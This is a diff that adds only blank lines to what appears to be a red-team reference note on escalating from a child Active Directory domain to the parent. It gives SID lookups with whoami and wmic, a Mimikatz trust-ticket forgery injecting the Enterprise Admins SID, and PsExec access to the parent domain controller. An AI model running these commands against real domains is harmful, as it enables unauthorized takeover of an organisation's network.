@@ -36,9 +36,15 @@ Use the krbtgt NTLM hash of a compromised child domain to forge a Kerberos Trust
 
 Use the krbtgt NTLM hash of a compromised child domain to forge a Kerberos Trust Ticket. Using SIDHistory, attackers can add the SID of privileged groups in the parent domain, and therefore impersonate them and gain full domain administrator access. This attack will not work if the parent domain has SID filtering enabled (disabled by default).
 
+
+
 # Instructions
 
 1. Get the SID of the current (child) domain.
+
+
+
+
 
 **Command** ([[whoami Display the Current User's SID]]):
 
@@ -46,11 +52,19 @@ Use the krbtgt NTLM hash of a compromised child domain to forge a Kerberos Trust
 whoami.exe /name
 ```
 
+
+
 Note: This returns the current domain user's SID. The domain SID is the same as the user SID, with the last set of numbers removed. For example:
 User SID:        **S-1-5-21-1576920733-1301476157-954876328**-1108
 Domain SID:  **S-1-5-21-1576920733-1301476157-954876328**
 
+
+
 2. Get the SID of a privileged group in the parent domain. A common target is the "Enterprise Admins" group.
+
+
+
+
 
 **Command** ([[wmic Get a Group's SID from Active Directory]]):
 
@@ -58,7 +72,15 @@ Domain SID:  **S-1-5-21-1576920733-1301476157-954876328**
 wmic.exe group where name="$_TARGET_GROUP" get name,sid,domain
 ```
 
+
+
+
+
 3. Use Mimikatz to forge the Internal AD Forest Trust Ticket.
+
+
+
+
 
 **Command** ([[Mimikatz Forge an Internal AD Forest Trust Ticket]]):
 
@@ -66,13 +88,25 @@ wmic.exe group where name="$_TARGET_GROUP" get name,sid,domain
 mimikatz.exe "kerberos::golden /domain:$_CHILD_DOMAIN /sid:$_CHILD_DOMAIN_SID /sids:$_ENTERPRISE_ADMIN_SID /user:Administrator /krbtgt:$_KRBTGT_NTLM /ptt" "exit"
 ```
 
+
+
+
+
 4. Use a tool such as PsExec to connect to the parent DC using the Internal AD Forest Trust Ticket.
+
+
+
+
 
 **Command** ([[PsExec Spawn a PowerShell Prompt as SYSTEM]]):
 
 ```powershell
 PsExec.exe -accepteula \\$_TARGET powershell.exe
 ```
+
+
+
+
 
 ## Platforms
 
@@ -99,3 +133,5 @@ PsExec.exe -accepteula \\$_TARGET powershell.exe
 ## Tags
 
 - [[Active Directory]]
+
+
